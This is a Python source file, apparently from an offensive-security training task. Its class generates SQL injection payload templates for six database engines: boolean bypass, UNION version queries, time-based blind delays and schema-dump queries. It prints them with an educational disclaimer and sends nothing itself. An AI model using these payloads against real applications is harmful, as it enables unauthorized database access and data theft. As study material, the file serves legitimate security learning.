import datetime

class SQLiGenerator:
    """
    Module for generating educational SQL Injection templates.
    Part of the ITSOLERA Offensive Security Tool Development Task.
    """
    def __init__(self):
        # Expanded database dictionary with Oracle and MSSQL
        self.db_types = {
            "mysql": {
                "comment": "-- ", 
                "version": "@@version",
                "sleep": "SLEEP(5)",
                "schema_table": "information_schema.tables"
            },
            "mariadb": {
                "comment": "-- ", 
                "version": "@@version",
                "sleep": "SLEEP(5)",
                "schema_table": "information_schema.tables"
            },
            "sqlite": {
                "comment": "--", 
                "version": "sqlite_version()",
                "sleep": "N/A (No native sleep)", # SQLite doesn't have a built-in sleep
                "schema_table": "sqlite_master"
            },
            "postgresql": {
                "comment": "-- ", 
                "version": "version()",
                "sleep": "pg_sleep(5)",
                "schema_table": "information_schema.tables"
            },
            "oracle": {
                "comment": "-- ", 
                "version": "v$version",
                "sleep": "DBMS_PIPE.RECEIVE_MESSAGE('RDS', 5)",
                "from_dual": " FROM dual", # Oracle requires a FROM clause even for constants
                "schema_table": "all_tables"
            },
            "mssql": {
                "comment": "--", 
                "version": "@@version",
                "sleep": "WAITFOR DELAY '0:0:5'",
                "schema_table": "master..sysdatabases"
            }
        }

    def generate_template(self, attack_type, db_target="mysql"):
        """
        Generates a non-executing SQLi pattern for study.
        """
        db = self.db_types.get(db_target.lower(), self.db_types["mysql"])
        comment = db["comment"]
        dual = db.get("from_dual", "") # Only used for Oracle
        
        # Dictionary of payload patterns
        templates = {
            "boolean": f"' OR 1=1 {comment}",
            "error": f"admin' {comment}",
            "union_version": f"' UNION SELECT {db['version']}{dual} {comment}",
            "time_blind": f"' AND {db['sleep']}{dual} {comment}",
            "schema_dump": f"' UNION SELECT table_name FROM {db['schema_table']} {comment}"
        }

        # Specialized handling for SQLite schema (uses 'sql' or 'name' column)
        if db_target == "sqlite" and attack_type == "schema_dump":
            templates["schema_dump"] = f"' UNION SELECT name FROM sqlite_master WHERE type='table' {comment}"

        payload = templates.get(attack_type.lower(), "Invalid Attack Type")
        
        return self._format_educational_output(payload, attack_type, db_target)

    def _format_educational_output(self, payload, type_name, db):
        header = f"--- ITSOLERA EDUCATIONAL: {type_name.upper()} ({db.upper()}) ---"
        disclaimer = "[DISCLAIMER] For educational bypass research only. Do not use on unauthorized systems."
        return f"{header}\nPayload: {payload}\n{disclaimer}\n"

# Simple test runner
if __name__ == "__main__":
    gen = SQLiGenerator()
    print(gen.generate_template("union_version", "oracle"))
    print(gen.generate_template("time_blind", "mssql"))
    print(gen.generate_template("schema_dump", "sqlite"))
